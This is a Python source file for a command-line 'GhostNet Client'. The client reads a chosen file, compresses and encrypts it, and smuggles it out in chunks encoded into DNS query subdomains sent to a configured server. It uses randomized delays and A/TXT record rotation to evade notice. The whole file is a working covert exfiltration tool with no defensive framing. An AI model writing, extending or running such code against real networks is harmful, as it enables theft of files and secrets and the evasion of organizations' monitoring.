import socket
import struct
import os
import time
import random
import argparse
import zlib
import uuid
import logging
from typing import List

import structlog
from common import config, encryption_utils, dns_utils

# Configure structlog
structlog.configure(
    processors=[
        structlog.processors.TimeStamper(fmt="iso"),
        structlog.processors.JSONRenderer()
    ],
    logger_factory=structlog.PrintLoggerFactory(),
)
log = structlog.get_logger()

class GhostClient:
    def __init__(self):
        self.domain = config.domain
        self.server_ip = config.server_ip
        self.port = config.server_port
        self.encryption_key = config.encryption_key
        self.chunk_size = config.chunk_size
        self.delay_min = config.delay_min
        self.delay_max = config.delay_max

    def build_dns_query(self, qname: str, qtype: int = 1) -> bytes:
        tid = os.urandom(2)
        flags = b'\x01\x00'
        counts = struct.pack(">HHHH", 1, 0, 0, 0)
        
        parts = qname.split('.')
        qname_encoded = b''
        for part in parts:
            qname_encoded += bytes([len(part)]) + part.encode()
        qname_encoded += b'\x00'
        
        qtype_class = struct.pack(">HH", qtype, 1)
        return tid + flags + counts + qname_encoded + qtype_class

    def send_chunk(self, sock: socket.socket, addr: tuple, payload: bytes, session_id: str, seq_num: int, qtype: int = 1) -> bool:
        encoded_payload = dns_utils.encode_chunk(payload)
        fqdn = dns_utils.build_subdomain(encoded_payload, session_id, self.domain)
        packet = self.build_dns_query(fqdn, qtype=qtype)
        
        retries = 3
        while retries > 0:
            try:
                sock.sendto(packet, addr)
                sock.settimeout(2.0)
                data, _ = sock.recvfrom(512)
                return True
            except socket.timeout:
                log.warning("chunk_timeout", seq_num=seq_num, retries_left=retries-1)
                retries -= 1
            except Exception as e:
                log.error("chunk_send_error", seq_num=seq_num, error=str(e))
                return False
        return False

    def send_file(self, filepath: str, mode: str = "A"):
        if not os.path.exists(filepath):
            log.error("file_not_found", path=filepath)
            return

        log.info("transfer_started", path=filepath, mode=mode)
        
        with open(filepath, 'rb') as f:
            data = f.read()
        
        compressed = zlib.compress(data)
        encrypted = encryption_utils.encrypt_data(compressed, self.encryption_key)
        chunks = dns_utils.prepare_chunks(encrypted, self.chunk_size)
        
        session_id = str(uuid.uuid4())[:8]
        log.info("session_initialized", session_id=session_id, total_chunks=len(chunks))
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        addr = (self.server_ip, self.port)
        
        # Map mode to QTYPE
        type_map = {"A": dns_utils.QTYPE_A, "TXT": dns_utils.QTYPE_TXT}
        
        for seq, chunk_data, is_last in chunks:
            # Determine QTYPE for this chunk
            if mode == "RANDOM":
                qtype = random.choice([dns_utils.QTYPE_A, dns_utils.QTYPE_TXT])
            else:
                qtype = type_map.get(mode, dns_utils.QTYPE_A)
                
            payload = dns_utils.build_payload(seq, chunk_data, is_last)
            if self.send_chunk(sock, addr, payload, session_id, seq, qtype=qtype):
                log.info("chunk_sent", seq=seq, total=len(chunks)-1, type="A" if qtype==1 else "TXT")
            else:
                log.error("transfer_aborted", session_id=session_id)
                return
            
            time.sleep(random.uniform(self.delay_min, self.delay_max))
            
        log.info("transfer_completed", session_id=session_id)

def main():
    parser = argparse.ArgumentParser(description="GhostNet Client")
    parser.add_argument("file", help="File to send")
    parser.add_argument("--mode", choices=["A", "TXT", "RANDOM"], default="A", help="DNS record type to use")
    args = parser.parse_args()
    
    client = GhostClient()
    client.send_file(args.file, mode=args.mode)

if __name__ == "__main__":
    main()
